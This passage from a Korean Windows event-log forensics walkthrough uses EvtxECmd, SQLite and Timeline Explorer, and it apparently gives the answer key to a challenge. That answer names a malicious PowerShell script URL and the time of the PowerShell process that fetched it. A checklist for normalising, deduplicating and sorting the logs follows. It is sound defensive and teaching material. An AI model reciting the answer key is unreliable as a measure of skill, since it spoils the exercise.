   conhost.exe 는 powershell 이 만든 부수 프로세스다(부모 PID 확인으로 확증).

7. KST 변환
   SELECT datetime('2026-03-14 07:20:08', '+9 hours');
   -> 2026-03-14 16:20:08

정답: URL = http://203.0.113.77/a.ps1
      직전 프로세스 생성 시각 = 2026-03-14 16:20:08 KST
      (powershell.exe, Security RecordId 1184574)
```

세 번의 교정이 핵심이다. **① CSV를 Excel로 열면 데이터가 변형된다** — Timeline Explorer/sqlite로 간다. **② 긴 본문은 `PayloadData*` 가 아니라 `Payload` 에만 있다.** **③ 같은 초의 순서는 채널 안에서 `RecordId` 로 정하고, 채널이 다르면 번호 비교 자체가 무효다.**

## 막혔을 때 다음 체크

1. `-d` 로 폴더 전체를 한 번에 뽑았는가
2. `Channel` 과 `Payload` 컬럼을 정규화 CSV에 남겼는가
3. 필터를 `PayloadData*` 가 아니라 `Payload` 로 걸었는가
4. `Get-Member` 로 실제 컬럼명을 확인했는가
5. `Archive-*.evtx` 중복을 `Channel` + `RecordId` 로 제거했는가
6. `ForwardedEvents` 를 `Computer` 로 분리했는가
7. 모든 시각이 UTC인가 (`Get-WinEvent` 는 로컬이다)
8. 정렬을 `TimeUTC` → `Channel` → `RecordId` 3단으로 했는가
9. `RecordId` 를 `[int64]` 로 캐스팅했는가
10. pandas에서 `dtype=str` 을 줬는가
11. sqlite에 인덱스를 만들었는가
12. 원본 evtx 개수와 `SourceFile` 종류 수가 일치하는가
13. `--inc` 로 뽑은 CSV로 gap을 판정하고 있지 않은가
14. Excel로 CSV를 열지 않았는가
15. 답 시각을 마지막에만 KST(+9시간)로 바꿨는가

## 출처

- SRC-004 — Eric Zimmerman 문서: EvtxECmd의 `-f`/`-d`/`--csv`/`--csvf`/`--inc`/`--exc`/`--json` 옵션, CSV 컬럼 구성(`EventRecordId`, `TimeCreated`, `Channel`, `Computer`, `Provider`, `MapDescription`, `PayloadData1~6`, `Payload`, `SourceFile`), 맵 파일이 있는 이벤트만 `MapDescription` 이 채워진다는 동작, Timeline Explorer의 필터·태깅
- SRC-026 — Libyal libevtx, EVTX 포맷 문서: 레코드 식별자가 파일(채널) 단위로 유일하다는 근거 — 중복 제거 키를 `Channel` + `EventRecordId` 로 잡는 이유
- SRC-011 — SQLite 문서: `datetime()` / `strftime()` 의 입력 형식(`YYYY-MM-DD HH:MM:SS`)과 `+9 hours` 수식자, CSV `.import` 동작
- EvtxECmd의 옵션 이름(중복 방지·날짜 범위 필터 등)과 CSV 컬럼명은 버전에 따라 다르므로 `EvtxECmd.exe` 도움말과 `Get-Member` 결과로 실제 값을 확인할 것
- `sqlite3` 의 `.import` 문법은 버전에 따라 `--csv` 플래그 지원 여부가 다르므로 `.help import` 로 확인할 것
